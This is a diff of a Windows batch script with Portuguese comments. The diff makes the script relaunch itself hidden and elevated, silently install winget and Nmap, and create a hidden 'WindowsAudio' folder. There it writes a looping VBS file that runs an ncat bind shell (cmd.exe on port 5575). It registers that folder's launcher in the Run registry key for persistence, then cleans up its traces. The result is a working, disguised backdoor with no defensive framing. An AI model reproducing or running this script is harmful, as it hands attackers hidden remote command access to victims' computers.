@@ -1,17 +1,44 @@
 @echo off
-echo [*] Instalando Nmap (ncat)...
+:: Ocultar esta janela imediatamente
+if not "%1"=="hidden" (
+    powershell -WindowStyle Hidden -Command "Start-Process cmd -ArgumentList '/c \"%~f0\" hidden' -WindowStyle Hidden -Verb RunAs"
+    exit
+)
+
+:: Tudo abaixo roda invisível
+
+:: Verificar e instalar winget se necessário
+where winget > nul 2>&1
+if %errorlevel% neq 0 (
+    echo [*] Instalando Winget...
+    powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://aka.ms/getwinget' -OutFile '%TEMP%\winget.msixbundle'" > nul 2>&1
+    start "" /wait powershell -WindowStyle Hidden -Command "Add-AppxPackage -Path '%TEMP%\winget.msixbundle'" > nul 2>&1
+)
+
+:: Instalar Nmap
+echo [*] Instalando Nmap...
 winget install Insecure.Nmap --silent --accept-package-agreements --accept-source-agreements > nul 2>&1
-echo [*] Instalando...
+
+:: Criar pasta oculta
 mkdir "%USERPROFILE%\WindowsAudio" > nul 2>&1
 attrib +h "%USERPROFILE%\WindowsAudio" > nul 2>&1
+
+:: Criar audio.vbs
 echo Do > "%USERPROFILE%\WindowsAudio\audio.vbs"
 echo CreateObject("Wscript.Shell").Run "ncat -lnp 5575 -e cmd.exe", 0, True >> "%USERPROFILE%\WindowsAudio\audio.vbs"
 echo Loop >> "%USERPROFILE%\WindowsAudio\audio.vbs"
+
+:: Criar audio.bat
 echo @echo off > "%USERPROFILE%\WindowsAudio\audio.bat"
 echo start "" /B wscript.exe //nologo "%USERPROFILE%\WindowsAudio\audio.vbs" >> "%USERPROFILE%\WindowsAudio\audio.bat"
 echo exit >> "%USERPROFILE%\WindowsAudio\audio.bat"
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsAudio" /t REG_SZ /d "%USERPROFILE%\WindowsAudio\audio.bat" /f
+
+:: Registrar no Windows
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsAudio" /t REG_SZ /d "%USERPROFILE%\WindowsAudio\audio.bat" /f > nul 2>&1
+
+:: Iniciar listener
 start "" /B wscript.exe //nologo "%USERPROFILE%\WindowsAudio\audio.vbs"
-echo [OK] Instalado!
-timeout /t 2 > nul
+
+:: Limpar e sair
+del "%TEMP%\winget.msixbundle" > nul 2>&1
 exit
